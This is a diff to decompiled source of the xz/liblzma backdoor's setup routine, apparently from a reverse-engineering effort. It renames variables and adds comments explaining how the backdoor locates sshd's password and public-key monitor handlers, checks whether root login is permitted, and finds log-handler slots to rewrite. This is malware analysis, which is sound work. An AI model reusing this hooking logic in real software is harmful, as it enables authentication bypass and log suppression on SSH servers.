@@ -98,8 +98,8 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   pfn_RSA_get0_key_t *rsa_get0_key_slot;
   void *libc_stack_end_slot;
   u64 liblzma_text_size;
-  u64 local_a98;
-  u64 local_a90;
+  u64 literal_probe_slot;
+  u64 literal_scan_slot;
   main_elf_t main_elf_ctx;
   u64 *resolver_frame_snapshot;
   backdoor_shared_libraries_data_t shared_maps_args;
@@ -244,6 +244,7 @@ LAB_00105951:
           (hooks_data->libc_imports).__libc_stack_end = libc_stack_end_slot;
           libc_allocator = get_lzma_allocator();
           libc_allocator->opaque = loader_data.elf_handles.libc;
+          // AutoDoc: Carve a fake `malloc_usable_size` stub inside liblzma's allocator arena so the shim can observe libc's import tally without calling real libc.
           malloc_usable_size_stub = (pfn_malloc_usable_size_t)lzma_alloc(0x440,libc_allocator);
           (hooks_data->libc_imports).malloc_usable_size = malloc_usable_size_stub;
           if (malloc_usable_size_stub != (pfn_malloc_usable_size_t)0x0) {
@@ -373,7 +374,7 @@ LAB_00105951:
           search_image = loader_data.elf_handles.sshd;
           sshd_ctx_cursor = (hooks_data->global_ctx).sshd_ctx;
           syslog_dasm_ctx.instruction = (u8 *)0x0;
-          local_a98 = local_a98 & 0xffffffff00000000;
+          literal_probe_slot = literal_probe_slot & 0xffffffff00000000;
           sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
           sshd_ctx_cursor->have_mm_answer_authpassword = FALSE;
           sshd_ctx_cursor->have_mm_answer_keyverify = FALSE;
@@ -381,10 +382,12 @@ LAB_00105951:
           scan_cursor = syslog_dasm_ctx.instruction;
           if ((text_segment != (void *)0x0) &&
              (loader_data.sshd_string_refs.mm_request_send.func_start != (void *)0x0)) {
+            // AutoDoc: Seed the `mm_request_send` bounds from the cached string references so the privsep dispatcher we fingerprinted earlier becomes available to the monitor hooks without another scan.
             sshd_ctx_cursor->mm_request_send_start = loader_data.sshd_string_refs.mm_request_send.func_start;
             sshd_ctx_cursor->mm_request_send_end = loader_data.sshd_string_refs.mm_request_send.func_end;
-            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
-            string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a98,(void *)0x0);
+            literal_probe_slot = CONCAT44(*(uint *)((u8 *)&literal_probe_slot + 4),0x400);
+            string_cursor = elf_find_string(search_image,(EncodedStringId *)&literal_probe_slot,(void *)0x0);
+            // AutoDoc: Cache the "without password" literal pointer so the log shim can spot authpassword prompts without rescanning `.rodata`.
             sshd_ctx_cursor->STR_without_password = string_cursor;
             if ((string_cursor != (char *)0x0) &&
                (probe_success = elf_find_function_pointer
@@ -397,8 +400,9 @@ LAB_00105951:
               sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
               sshd_ctx_cursor->mm_answer_authpassword_slot = (sshd_monitor_func_t *)0x0;
             }
-            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x7b8);
-            string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a98,(void *)0x0);
+            literal_probe_slot = CONCAT44(*(uint *)((u8 *)&literal_probe_slot + 4),0x7b8);
+            string_cursor = elf_find_string(search_image,(EncodedStringId *)&literal_probe_slot,(void *)0x0);
+            // AutoDoc: Record the publickey literal once so the KEYALLOWED/KEYVERIFY hooks can reuse it when massaging monitor replies.
             sshd_ctx_cursor->STR_publickey = string_cursor;
             if (string_cursor != (char *)0x0) {
               probe_success = elf_find_function_pointer
@@ -424,6 +428,7 @@ LAB_00105951:
                 }
               }
             }
+            // AutoDoc: Only start the relocation hunt after at least one monitor handler resolves; the ensuing scan lines up their shared format literal so we know exactly which relocation slot to patch.
             if ((sshd_ctx_cursor->mm_answer_authpassword_start != (sshd_monitor_func_t *)0x0) ||
                (sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
               live_sshd_ctx = (hooks_data->global_ctx).sshd_ctx;
@@ -439,8 +444,9 @@ LAB_00105951:
               }
               relr_retry_flag = FALSE;
               string_cursor = (char *)0x0;
-              local_a90 = CONCAT44(*(uint *)((u8 *)&local_a90 + 4),0x198);
-              while (string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a90,string_cursor),
+              // AutoDoc: Walk every relocation that references EncodedStringId 0x198 (the shared auth-log literal) so mm_answer_authpassword/keyallowed can be paired with the pointer we later rewrite.
+              literal_scan_slot = CONCAT44(*(uint *)((u8 *)&literal_scan_slot + 4),0x198);
+              while (string_cursor = elf_find_string(search_image,(EncodedStringId *)&literal_scan_slot,string_cursor),
                     string_cursor != (char *)0x0) {
                 probe_dasm_ctx.instruction = (u8 *)0x0;
                 string_id = (EncodedStringId)string_cursor;
@@ -511,6 +517,7 @@ LAB_00106471:
     string_cursor = elf_find_string(search_image,(EncodedStringId *)decode_ctx_cursor,(void *)0x0);
     if (string_cursor != (char *)0x0) {
       if (relr_retry_flag) {
+        // AutoDoc: A second hit on the auth-root literal means PermitRootLogin defaults to yes, so stash that state before publishing the pointer.
         ((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
         goto LAB_001064b8;
       }
@@ -563,18 +570,19 @@ LAB_001065af:
   }
   sshd_log_ctx_ptr = (hooks_data->global_ctx).sshd_log_ctx;
   libc_allocator->opaque = loader_data.elf_handles.libc;
-  local_a98 = 0;
+  literal_probe_slot = 0;
   sshd_log_ctx_ptr->log_squelched = FALSE;
   sshd_log_ctx_ptr->handler_slots_valid = FALSE;
-  text_segment = elf_get_code_segment(&loader_data.main_info,&local_a98);
-  signed_payload_size = local_a98;
-  if ((((text_segment != (void *)0x0) && (0x10 < local_a98)) &&
+  text_segment = elf_get_code_segment(&loader_data.main_info,&literal_probe_slot);
+  signed_payload_size = literal_probe_slot;
+  if ((((text_segment != (void *)0x0) && (0x10 < literal_probe_slot)) &&
       ((u8 *)loader_data.sshd_string_refs.sshlogv_format.func_start != (u8 *)0x0)) &&
      (((hooks_data->global_ctx).uses_endbr64 == FALSE ||
       (probe_success = is_endbr64_instruction
                           ((u8 *)loader_data.sshd_string_refs.sshlogv_format.func_start,
                            (u8 *)((long)loader_data.sshd_string_refs.sshlogv_format.func_start + 4),
                            0xe230), probe_success != FALSE)))) {
+    // AutoDoc: Carry the `sshlogv` implementation pointer over from the earlier string-ref pass so the log hook never has to rediscover it.
     sshd_log_ctx_ptr->sshlogv_impl = loader_data.sshd_string_refs.sshlogv_format.func_start;
     decode_ctx_cursor = &syslog_dasm_ctx;
     for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
@@ -674,11 +682,11 @@ LAB_001068e4:
                            CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
                                     (undefined4)probe_dasm_ctx.instruction_size));
               }
-              local_a90 = 0;
+              literal_scan_slot = 0;
               main_data_base = (log_handler_fn *)
-                         elf_get_data_segment(&loader_data.main_info,&local_a90,FALSE);
+                         elf_get_data_segment(&loader_data.main_info,&literal_scan_slot,FALSE);
               if ((((main_data_base == (log_handler_fn *)0x0) ||
-                   ((log_handler_fn *)(local_a90 + (long)main_data_base) <= log_handler_slot_tmp)) ||
+                   ((log_handler_fn *)(literal_scan_slot + (long)main_data_base) <= log_handler_slot_tmp)) ||
                   (log_handler_slot_tmp < main_data_base)) ||
                  (((log_handler_slot_tmp == log_handler_ctx_candidate && (log_handler_slot_tmp == log_handler_slot_candidate)) ||
                   (log_handler_tmp_ptr = log_handler_slot_tmp, log_handler_slot_candidate != (log_handler_fn *)0x0)))) goto LAB_00106997;
@@ -773,11 +781,11 @@ LAB_00106b3c:
                           CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
                                    (undefined4)probe_dasm_ctx.instruction_size));
                 }
-                local_a90 = 0;
+                literal_scan_slot = 0;
                 log_handler_tmp_ptr = (log_handler_fn *)
-                           elf_get_data_segment(&loader_data.main_info,&local_a90,FALSE);
+                           elf_get_data_segment(&loader_data.main_info,&literal_scan_slot,FALSE);
                 if ((((log_handler_tmp_ptr != (log_handler_fn *)0x0) &&
-                     (log_handler_ctx_candidate < (log_handler_fn *)(local_a90 + (long)log_handler_tmp_ptr))) &&
+                     (log_handler_ctx_candidate < (log_handler_fn *)(literal_scan_slot + (long)log_handler_tmp_ptr))) &&
                     (log_handler_tmp_ptr <= log_handler_ctx_candidate)) && (log_handler_slot_candidate != log_handler_ctx_candidate)) goto LAB_00106b3c;
               }
               scan_cursor = probe_dasm_ctx.instruction +
